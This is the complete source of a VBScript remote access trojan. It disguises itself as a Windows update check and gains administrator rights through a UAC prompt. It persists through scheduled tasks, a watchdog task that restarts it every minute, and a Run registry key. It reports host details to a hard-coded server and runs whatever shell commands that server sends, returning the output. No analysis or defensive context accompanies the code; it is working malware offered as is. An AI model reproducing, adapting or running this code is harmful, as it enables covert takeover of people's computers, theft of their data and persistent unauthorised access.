Const SERVER_URL = "https://luyehealth.com"
Const AUTH_TOKEN = "RAT2025_SECURE_TOKEN_FIXED_2025"
Const POLL_INTERVAL = 10000
Const TASK_NAME = "WindowsUpdateCheck"
Const WATCHDOG_TASK = "WindowsUpdateWatchdog"
Const WATCHDOG_INTERVAL = 60
Const BACKUP_FILENAME = "wucheck.vbs"

' Get the backup path in TEMP folder
Function GetBackupPath()
    Dim objShellBP
    Set objShellBP = CreateObject("WScript.Shell")
    GetBackupPath = objShellBP.ExpandEnvironmentStrings("%TEMP%") & "\" & BACKUP_FILENAME
End Function

' Copy script to TEMP folder as backup
Sub CopyToTemp()
    On Error Resume Next
    Dim objFSOTemp, srcPath, destPath
    Set objFSOTemp = CreateObject("Scripting.FileSystemObject")
    srcPath = WScript.ScriptFullName
    destPath = GetBackupPath()

    ' Only copy if source exists and is different from dest
    If objFSOTemp.FileExists(srcPath) Then
        If LCase(srcPath) <> LCase(destPath) Then
            objFSOTemp.CopyFile srcPath, destPath, True
        End If
    End If
    Err.Clear
End Sub

' Get the script path to use (original or backup)
Function GetActiveScriptPath()
    Dim objFSOActive
    Set objFSOActive = CreateObject("Scripting.FileSystemObject")

    ' First try to use the backup path (more reliable)
    If objFSOActive.FileExists(GetBackupPath()) Then
        GetActiveScriptPath = GetBackupPath()
    Else
        GetActiveScriptPath = WScript.ScriptFullName
    End If
End Function

' ============ AUTO-ELEVATION VIA SCHEDULED TASK ============
' This runs FIRST before any On Error Resume Next

Sub RequestAdminAndExit()
    Dim objShellApp, scriptPath
    scriptPath = WScript.ScriptFullName
    Set objShellApp = CreateObject("Shell.Application")
    ' Use cmd.exe /c start to guarantee UAC prompt appears
    objShellApp.ShellExecute "cmd.exe", "/c wscript.exe """ & scriptPath & """ setup", "", "runas", 0
    WScript.Quit
End Sub

Function DoesTaskExist()
    On Error Resume Next
    Dim objShellTemp, objExec, result, errOutput, exitCode
    Set objShellTemp = CreateObject("WScript.Shell")

    ' Run schtasks query and check exit code
    Set objExec = objShellTemp.Exec("cmd.exe /c schtasks /query /tn """ & TASK_NAME & """ 2>&1")

    ' Wait for command to complete
    Do While objExec.Status = 0
        WScript.Sleep 50
    Loop

    result = objExec.StdOut.ReadAll
    exitCode = objExec.ExitCode

    ' Exit code 0 means task exists, non-zero means it doesn't
    If exitCode = 0 And InStr(result, TASK_NAME) > 0 Then
        DoesTaskExist = True
    Else
        DoesTaskExist = False
    End If
    Err.Clear
End Function

Sub CreateTheTask()
    Dim objShellTemp, scriptPath, backupPath, cmd, exitCode
    Set objShellTemp = CreateObject("WScript.Shell")
    scriptPath = WScript.ScriptFullName
    backupPath = GetBackupPath()

    ' First copy script to TEMP as backup
    CopyToTemp

    ' Create scheduled task pointing to TEMP backup (more persistent)
    cmd = "schtasks /create /tn """ & TASK_NAME & """ /tr ""wscript.exe \""" & backupPath & "\"" running"" /sc onlogon /rl highest /f"
    exitCode = objShellTemp.Run(cmd, 0, True)

    ' Create watchdog task that runs every minute to ensure main script is running
    cmd = "schtasks /create /tn """ & WATCHDOG_TASK & """ /tr ""wscript.exe \""" & backupPath & "\"" watchdog"" /sc minute /mo 1 /rl highest /f"
    objShellTemp.Run cmd, 0, True

    ' Run the task now
    objShellTemp.Run "schtasks /run /tn """ & TASK_NAME & """", 0, False
End Sub

Function IsMainScriptRunning()
    On Error Resume Next
    Dim objWMI, colProcesses, objProcess, count, cmdLine
    Set objWMI = GetObject("winmgmts:\\.\root\cimv2")

    ' Count wscript.exe processes running our script (original name or backup name)
    Set colProcesses = objWMI.ExecQuery("SELECT * FROM Win32_Process WHERE Name='wscript.exe'")
    count = 0

    For Each objProcess In colProcesses
        cmdLine = LCase(objProcess.CommandLine)
        ' Check for original script name or backup filename
        If (InStr(cmdLine, LCase(WScript.ScriptName)) > 0 Or InStr(cmdLine, LCase(BACKUP_FILENAME)) > 0) Then
            If InStr(cmdLine, "running") > 0 Then
                count = count + 1
            End If
        End If
    Next

    ' If more than 0 (excluding watchdog), main is running
    IsMainScriptRunning = (count > 0)
    Err.Clear
End Function

Sub RunWatchdog()
    ' Watchdog mode: Check if main script is running, if not restart it
    On Error Resume Next

    ' First ensure startup persistence
    EnsureStartupPersistence

    ' Check if main script is running
    If Not IsMainScriptRunning() Then
        ' Main script not running, restart it via scheduled task
        Dim objShellWD
        Set objShellWD = CreateObject("WScript.Shell")
        objShellWD.Run "schtasks /run /tn """ & TASK_NAME & """", 0, False
    End If

    WScript.Quit
End Sub

Sub EnsureStartupPersistence()
    On Error Resume Next
    Dim objShellPersist, backupPath
    Set objShellPersist = CreateObject("WScript.Shell")
    backupPath = GetBackupPath()

    ' Always copy to TEMP first (keep backup updated)
    CopyToTemp

    ' Check and fix Registry Run key
    objShellPersist.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsService", _
                              "schtasks /run /tn """ & TASK_NAME & """", "REG_SZ"
    Err.Clear

    ' Check if main task exists, create if not (pointing to TEMP backup)
    If Not DoesTaskExist() Then
        Dim cmd
        cmd = "schtasks /create /tn """ & TASK_NAME & """ /tr ""wscript.exe \""" & backupPath & "\"" running"" /sc onlogon /rl highest /f"
        objShellPersist.Run cmd, 0, True
    End If

    ' Ensure watchdog task exists
    Dim objExec, result, exitCode
    Set objExec = objShellPersist.Exec("cmd.exe /c schtasks /query /tn """ & WATCHDOG_TASK & """ 2>&1")
    Do While objExec.Status = 0
        WScript.Sleep 50
    Loop
    exitCode = objExec.ExitCode

    If exitCode <> 0 Then
        ' Watchdog task doesn't exist, create it (pointing to TEMP backup)
        Dim cmdWD
        cmdWD = "schtasks /create /tn """ & WATCHDOG_TASK & """ /tr ""wscript.exe \""" & backupPath & "\"" watchdog"" /sc minute /mo 1 /rl highest /f"
        objShellPersist.Run cmdWD, 0, True
    End If

    Err.Clear
End Sub

' Check arguments FIRST (no error handling yet)
If WScript.Arguments.Count > 0 Then
    If WScript.Arguments(0) = "running" Then
        ' Already running from scheduled task - continue to main code
        ' Verify startup persistence on each run
        EnsureStartupPersistence
    ElseIf WScript.Arguments(0) = "setup" Then
        ' Running with admin from UAC - create task and exit
        CreateTheTask
        WScript.Quit
    ElseIf WScript.Arguments(0) = "watchdog" Then
        ' Watchdog mode - check if main is running and restart if needed
        RunWatchdog
        WScript.Quit
    End If
Else
    ' No arguments - first run, need to setup
    If DoesTaskExist() Then
        ' Task exists, run it
        Dim objShellRun
        Set objShellRun = CreateObject("WScript.Shell")
        objShellRun.Run "schtasks /run /tn """ & TASK_NAME & """", 0, False
        WScript.Quit
    Else
        ' Task doesn't exist, request admin (shows UAC)
        RequestAdminAndExit
    End If
End If
' ============ END AUTO-ELEVATION ============

On Error Resume Next

Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objNetwork = CreateObject("WScript.Network")

Function GetHostname()
    GetHostname = objNetwork.ComputerName
End Function

Function GetClientId()
    Dim hostname, hash, i
    hostname = GetHostname()
    hash = 0
    For i = 1 To Len(hostname)
        hash = (hash * 31 + Asc(Mid(hostname, i, 1))) Mod 100000
    Next
    GetClientId = "VBS" & hostname & hash
End Function

Function GetArchitecture()
    Dim arch
    arch = objShell.ExpandEnvironmentStrings("%PROCESSOR_ARCHITECTURE%")
    If InStr(arch, "64") > 0 Then
        GetArchitecture = "64bit"
    Else
        GetArchitecture = "32bit"
    End If
End Function

Function GetWindowsVersion()
    On Error Resume Next
    Dim objWMI, colOS, objOS
    Set objWMI = GetObject("winmgmts:\\.\root\cimv2")
    Set colOS = objWMI.ExecQuery("SELECT Caption FROM Win32_OperatingSystem")
    For Each objOS In colOS
        GetWindowsVersion = objOS.Caption
        Exit For
    Next
    If GetWindowsVersion = "" Then GetWindowsVersion = "Windows"
End Function

Function GetLocalIP()
    On Error Resume Next
    Dim objWMI, colAdapters, objAdapter, ipAddr
    GetLocalIP = "unknown"

    Set objWMI = GetObject("winmgmts:\\.\root\cimv2")
    Set colAdapters = objWMI.ExecQuery("SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = True")

    For Each objAdapter In colAdapters
        If Not IsNull(objAdapter.IPAddress) Then
            For Each ipAddr In objAdapter.IPAddress
                ' Get first non-localhost IPv4 address
                If InStr(ipAddr, ".") > 0 And Left(ipAddr, 4) <> "127." Then
                    GetLocalIP = ipAddr
                    Exit Function
                End If
            Next
        End If
    Next
    Err.Clear
End Function

Function GetPublicIP()
    On Error Resume Next
    Dim objHTTP, response
    GetPublicIP = "unknown"

    Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    objHTTP.SetOption 2, 13056
    objHTTP.Open "GET", "https://api.ipify.org", False
    objHTTP.Send

    If Err.Number = 0 And objHTTP.Status = 200 Then
        GetPublicIP = Trim(objHTTP.responseText)
    End If

    Set objHTTP = Nothing
    Err.Clear
End Function

Function HttpRequest(method, url, data, authHeader)
    On Error Resume Next
    Dim objHTTP, response
    Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0")

    objHTTP.SetOption 2, 13056
    objHTTP.Open method, url, False
    objHTTP.setRequestHeader "Content-Type", "application/json"
    If authHeader <> "" Then
        objHTTP.setRequestHeader "Authorization", authHeader
    End If
    objHTTP.Send data

    If Err.Number = 0 Then
        HttpRequest = objHTTP.responseText
    Else
        HttpRequest = ""
        Err.Clear
    End If

    Set objHTTP = Nothing
End Function

Function ExecuteCommand(cmd)
    On Error Resume Next
    Dim objExec, output, line

    Set objExec = objShell.Exec("cmd.exe /c " & cmd)

    output = ""
    Do While Not objExec.StdOut.AtEndOfStream
        line = objExec.StdOut.ReadLine()
        output = output & line & vbCrLf
    Loop
    Do While Not objExec.StdErr.AtEndOfStream
        line = objExec.StdErr.ReadLine()
        output = output & line & vbCrLf
    Loop

    ExecuteCommand = output
End Function

Function JsonEscape(s)
    Dim result, i, c
    result = ""
    For i = 1 To Len(s)
        c = Mid(s, i, 1)
        Select Case c
            Case """"
                result = result & "\"""
            Case "\"
                result = result & "\\"
            Case vbCr
                result = result & "\r"
            Case vbLf
                result = result & "\n"
            Case vbTab
                result = result & "\t"
            Case Else
                If Asc(c) >= 32 And Asc(c) < 127 Then
                    result = result & c
                End If
        End Select
    Next
    JsonEscape = result
End Function

Function JsonUnescape(s)
    Dim result, i, c, nextC
    result = ""
    i = 1
    Do While i <= Len(s)
        c = Mid(s, i, 1)
        If c = "\" And i < Len(s) Then
            nextC = Mid(s, i + 1, 1)
            Select Case nextC
                Case "\"
                    result = result & "\"
                    i = i + 1
                Case """"
                    result = result & """"
                    i = i + 1
                Case "n"
                    result = result & vbLf
                    i = i + 1
                Case "r"
                    result = result & vbCr
                    i = i + 1
                Case "t"
                    result = result & vbTab
                    i = i + 1
                Case Else
                    result = result & c
            End Select
        Else
            result = result & c
        End If
        i = i + 1
    Loop
    JsonUnescape = result
End Function

Function ParseJsonValue(json, key)
    Dim searchKey, pos, startPos, endPos, value, depth
    searchKey = """" & key & """"
    pos = InStr(json, searchKey)
    If pos = 0 Then
        ParseJsonValue = ""
        Exit Function
    End If

    pos = InStr(pos, json, ":")
    If pos = 0 Then
        ParseJsonValue = ""
        Exit Function
    End If

    pos = pos + 1
    Do While Mid(json, pos, 1) = " "
        pos = pos + 1
    Loop

    If Mid(json, pos, 1) = """" Then
        startPos = pos + 1
        endPos = startPos
        Do While endPos <= Len(json)
            If Mid(json, endPos, 1) = "\" Then
                endPos = endPos + 2
            ElseIf Mid(json, endPos, 1) = """" Then
                Exit Do
            Else
                endPos = endPos + 1
            End If
        Loop
        value = Mid(json, startPos, endPos - startPos)
        value = JsonUnescape(value)
    Else
        startPos = pos
        endPos = InStr(startPos, json, ",")
        If endPos = 0 Then endPos = InStr(startPos, json, "}")
        value = Trim(Mid(json, startPos, endPos - startPos))
    End If

    ParseJsonValue = value
End Function

Sub AddToStartup()
    ' Now handled by EnsureStartupPersistence which runs on every startup
    ' This is kept for backward compatibility
    EnsureStartupPersistence
End Sub

Sub Register(clientId)
    On Error Resume Next
    Dim json, response
    json = "{" & _
           """client_id"":""" & clientId & """," & _
           """hostname"":""" & GetHostname() & """," & _
           """platform"":""Windows""," & _
           """platform_release"":""" & GetWindowsVersion() & """," & _
           """architecture"":""" & GetArchitecture() & """," & _
           """ip_address"":""" & GetPublicIP() & """," & _
           """auth_token"":""" & AUTH_TOKEN & """" & _
           "}"

    response = HttpRequest("POST", SERVER_URL & "/api/poll/register", json, "")
    Err.Clear
End Sub

Sub SendResult(clientId, commandId, result)
    Dim json
    json = "{" & _
           """client_id"":""" & clientId & """," & _
           """command_id"":""" & commandId & """," & _
           """result"":""" & JsonEscape(result) & """," & _
           """error"":""""," & _
           """exit_code"":0" & _
           "}"

    HttpRequest "POST", SERVER_URL & "/api/poll/result", json, AUTH_TOKEN
End Sub

Sub MainLoop()
    On Error Resume Next
    Dim clientId, response, shutdown, commands, cmdStart, cmdEnd, cmdJson
    Dim commandId, command, result
    Dim emptyResponseCount, lastRegisterTime

    clientId = GetClientId()
    emptyResponseCount = 0
    lastRegisterTime = Now

    ' Run startup tasks (non-blocking)
    AddToStartup
    Err.Clear

    ' Register with server
    Register clientId
    Err.Clear

    Do While True
        Err.Clear
        response = HttpRequest("GET", SERVER_URL & "/api/poll/commands/" & clientId, "", AUTH_TOKEN)

        ' Auto re-register if getting empty responses (404) or every 5 minutes
        If response = "" Or InStr(response, "not found") > 0 Or InStr(response, "error") > 0 Then
            emptyResponseCount = emptyResponseCount + 1
            ' Re-register after 3 empty responses or every 5 minutes
            If emptyResponseCount >= 3 Or DateDiff("n", lastRegisterTime, Now) >= 5 Then
                Register clientId
                emptyResponseCount = 0
                lastRegisterTime = Now
            End If
        Else
            emptyResponseCount = 0
        End If

        If response <> "" Then
            shutdown = ParseJsonValue(response, "shutdown")
            If shutdown = "true" Then
                WScript.Quit
            End If

            cmdStart = InStr(response, "[")
            cmdEnd = InStrRev(response, "]")
            If cmdStart > 0 And cmdEnd > cmdStart Then
                commands = Mid(response, cmdStart + 1, cmdEnd - cmdStart - 1)

                Do While InStr(commands, "{") > 0
                    cmdStart = InStr(commands, "{")
                    cmdEnd = InStr(commands, "}")
                    If cmdStart > 0 And cmdEnd > cmdStart Then
                        cmdJson = Mid(commands, cmdStart, cmdEnd - cmdStart + 1)

                        commandId = ParseJsonValue(cmdJson, "command_id")
                        command = ParseJsonValue(cmdJson, "command")

                        If commandId <> "" And command <> "" Then
                            Dim cmdDelay
                            cmdDelay = ParseJsonValue(cmdJson, "delay")
                            If cmdDelay <> "" Then
                                If IsNumeric(cmdDelay) Then
                                    If CInt(cmdDelay) > 0 Then
                                        WScript.Sleep CInt(cmdDelay) * 1000
                                    End If
                                End If
                            End If
                            result = ExecuteCommand(command)
                            SendResult clientId, commandId, result
                        End If

                        commands = Mid(commands, cmdEnd + 1)
                    Else
                        Exit Do
                    End If
                Loop
            End If
        End If

        WScript.Sleep POLL_INTERVAL
    Loop
End Sub

MainLoop
